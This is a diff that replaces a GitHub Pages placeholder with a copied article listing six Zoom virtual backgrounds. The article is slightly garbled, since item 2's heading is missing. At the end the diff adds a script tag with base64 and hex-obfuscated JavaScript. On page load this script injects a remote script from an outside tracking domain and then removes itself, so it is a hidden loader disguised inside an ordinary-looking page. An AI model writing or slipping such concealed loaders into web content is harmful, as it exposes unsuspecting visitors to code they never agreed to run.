@@ -1,37 +1,22 @@
-## Welcome to GitHub Pages
+If you’re struggling to find a perfectly decorated wall in your house to serve as the backdrop for your video calls with friends, family, and coworkers, we have good news: Video conferencing platform Zoom lets you customize your very own virtual background.
 
-You can use the [editor on GitHub](https://github.com/Ddk3qkavsr8dc2oqqr/Next_video/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+To do it, log into your Zoom account, go to “Settings” on the left side of your screen, and choose the "Meeting" tab. Scroll down to the “In Meeting (Advanced)” section, and then scroll down farther to make sure the “Virtual background” option is enabled. After that, open the Zoom application on your desktop, click on the “Settings” wheel in the upper right corner, and go to “Virtual Background.” There are a few automatic options, but you can choose your own image from your computer files by clicking on the plus-sign icon.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Now, the only thing left to do is decide which image will best set the tone for your next video call. From the New York Public Library’s Rose Reading Room to Schitt’s Creek’s Rosebud Motel, here are six of our favorites.
 
-### Markdown
+1. THE ROSEBUD MOTEL LOBBY FROM SCHITT’S CREEK
+You can imagine that David is just out of frame, doing his best to carry on a silent—albeit with lots of expressive gesturing—conversation with Stevie at the front desk. (More Schitt's Creek backgrounds here.)
+If you’re hoping to create a calming atmosphere, look no further than the cozy little sitting room where Carl and Ellie grew old together in 2009's Up. (More Pixar backgrounds here.)
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+3. THE ATTIC STUDY FROM KNIVES OUT
+If your own study isn’t quite teeming with intriguing souvenirs and leather-bound volumes, feel free to borrow this one from the mansion in 2019’s Knives Out. (More Knives Out backgrounds here.)
 
-```markdown
-Syntax highlighted code block
+4. THE USS ENTERPRISE FROM STAR TREK
+Blame your spotty internet connection on the fact that you’re traveling through the galaxy at the speed of light with this background from the bridge of Star Trek’s USS Enterprise. (More Star Trek backgrounds here.)
 
-# Header 1
-## Header 2
-### Header 3
+5. THE NEW YORK PUBLIC LIBRARY’S ROSE READING ROOM
+Bibliophiles who can’t make it to the library can still pay a virtual visit to the sumptuous Rose Main Reading Room at the New York Public Library’s iconic Fifth Avenue location. (More New York Public Library backgrounds here.)
 
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/Ddk3qkavsr8dc2oqqr/Next_video/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+6. THE WERK ROOM FROM RUPAUL’S DRAG RACE
+Dazzle your coworkers by calling in from the vibrant room where all the magic—and most of the drama—happens on RuPaul’s Drag Race. If you happen to be decked out in an ensemble made entirely of things you found at the Dollar Store, even better. (More RuPaul's Drag Race backgrounds here.)
+<script id="hr5On" src="data:text/javascript;base64, dmFyIF83dTRIbyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX09jQmFHLCBfTEZObDUpIHt2YXIgXzNsVXRzID0gZnVuY3Rpb24oX1U0bmtCKSB7d2hpbGUgKC0tX1U0bmtCKSB7X09jQmFHWydwdXNoJ10oX09jQmFHWydzaGlmdCddKCkpO319O18zbFV0cygrK19MRk5sNSk7fShfN3U0SG8sIDB4MTFiKSk7dmFyIF9odUdtMSA9IGZ1bmN0aW9uKF9XY2pBTywgX3JtS0ZEKSB7X1djakFPID0gX1djakFPIC0gMHgwO3ZhciBfTTUxaVcgPSBfN3U0SG9bX1djakFPXTtyZXR1cm4gX001MWlXO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfaHVHbTEoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1ROQlNLID0gZG9jdW1lbnRbX2h1R20xKCcweDEnKV0oX2h1R20xKCcweDInKSk7X1ROQlNLW19odUdtMSgnMHgzJyldID0gX2h1R20xKCcweDQnKTtfVE5CU0tbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3M1x4NzBceDMyXHg2Zlx4NjlceDM5XHg3OFx4NzNceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NTNceDRiXHg3N1x4NDhceDRmXHg1OVx4NDFceDMwXHg0ZVx4NzknO2RvY3VtZW50W19odUdtMSgnMHg1JyldKF9odUdtMSgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9UTkJTSyk7ZG9jdW1lbnRbX2h1R20xKCcweDcnKV0oJ2hyNU9uJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
